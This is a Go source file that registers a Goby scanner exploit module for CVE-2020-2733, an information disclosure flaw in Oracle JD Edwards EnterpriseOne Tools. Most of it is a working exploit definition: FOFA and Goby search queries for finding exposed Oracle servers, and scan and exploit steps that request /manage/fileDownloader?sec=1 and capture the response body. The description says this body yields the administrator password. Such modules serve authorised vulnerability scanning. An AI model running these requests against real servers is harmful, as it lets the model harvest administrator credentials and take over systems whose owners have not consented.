package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Oracle JD Edwards EnterpriseOne Tools Information Disclosure (CVE-2020-2733)",
    "Description": "<p>Oracle JD Edwards Products is a fully integrated enterprise resource planning management software suite (ERP) from Oracle Corporation. The product provides application modules for financial management, project management and asset lifecycle management. JD Edwards EnterpriseOne Tools is one of the components used to install, update and manage JD Edwards EnterpriseOne applications.</p><p>A security vulnerability exists in the Monitoring and Diagnostics component of JD Edwards EnterpriseOne Tools version 9.2 in Oracle JD Edwards. An attacker could exploit this vulnerability to obtain the administrator password to control JD Edwards EnterpriseOne Tools.</p>",
    "Product": "Oracle JD Edwards",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2022-09-20",
    "Author": "csca",
    "FofaQuery": "banner=\"X-Oracle-Dms-Rid: 0\" || header=\"X-Oracle-Dms-Rid: 0\" || banner=\"Server: Oracle-HTTP-Server\" || header=\"Server: Oracle-HTTP-Server\"",
    "GobyQuery": "banner=\"X-Oracle-Dms-Rid: 0\" || header=\"X-Oracle-Dms-Rid: 0\" || banner=\"Server: Oracle-HTTP-Server\" || header=\"Server: Oracle-HTTP-Server\"",
    "Level": "3",
    "Impact": "<p>A security vulnerability exists in the Monitoring and Diagnostics component of JD Edwards EnterpriseOne Tools version 9.2 in Oracle JD Edwards. An attacker could exploit this vulnerability to obtain the administrator password to control JD Edwards EnterpriseOne Tools.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://www.oracle.com/security-alerts/cpuapr2020.html\">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p>",
    "References": [
        "https://redrays.io/cve-2020-2733-jd-edwards/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/manage/fileDownloader?sec=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "start_with",
                        "value": "ACHCJK",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "text/plain",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/manage/fileDownloader?sec=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "start_with",
                        "value": "ACHCJK",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "text/plain",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2020-2733"
    ],
    "CNNVD": [
        "CNNVD-202004-996"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Oracle JD Edwards EnterpriseOne Tools 套件 fileDownloader 文件信息泄漏漏洞 (CVE-2020-2733)",
            "Product": "Oracle JD Edwards",
            "Description": "<p>Oracle JD Edwards Products是美国甲骨文（Oracle）公司的一套全面集成的企业资源计划管理软件套件（ERP）。该产品提供财务管理、项目管理和资产生命周期管理等应用模块。JD Edwards EnterpriseOne Tools是其中的一个用于安装、更新和管理JD Edwards EnterpriseOne应用程序的组件。<br></p><p>Oracle JD Edwards中的JD Edwards EnterpriseOne Tools 9.2版本的Monitoring and Diagnostics组件存在安全漏洞。攻击者可利用该漏洞获取管理员密码控制JD Edwards EnterpriseOne Tools。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.oracle.com/security-alerts/cpuapr2020.html\">https://www.oracle.com/security-alerts/cpuapr2020.html</a><br></p>",
            "Impact": "<p>Oracle JD Edwards中的JD Edwards EnterpriseOne Tools 9.2版本的Monitoring and Diagnostics组件存在安全漏洞。攻击者可利用该漏洞获取管理员密码控制JD Edwards EnterpriseOne Tools。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Oracle JD Edwards EnterpriseOne Tools Information Disclosure (CVE-2020-2733)",
            "Product": "Oracle JD Edwards",
            "Description": "<p>Oracle JD Edwards Products is a fully integrated enterprise resource planning management software suite (ERP) from Oracle Corporation. The product provides application modules for financial management, project management and asset lifecycle management. JD Edwards EnterpriseOne Tools is one of the components used to install, update and manage JD Edwards EnterpriseOne applications.<br></p><p>A security vulnerability exists in the Monitoring and Diagnostics component of JD Edwards EnterpriseOne Tools version 9.2 in Oracle JD Edwards. An attacker could exploit this vulnerability to obtain the administrator password to control JD Edwards EnterpriseOne Tools.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://www.oracle.com/security-alerts/cpuapr2020.html\">https://www.oracle.com/security-alerts/cpuapr2020.html</a><br></p>",
            "Impact": "<p>A security vulnerability exists in the Monitoring and Diagnostics component of JD Edwards EnterpriseOne Tools version 9.2 in Oracle JD Edwards. An attacker could exploit this vulnerability to obtain the administrator password to control JD Edwards EnterpriseOne Tools.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}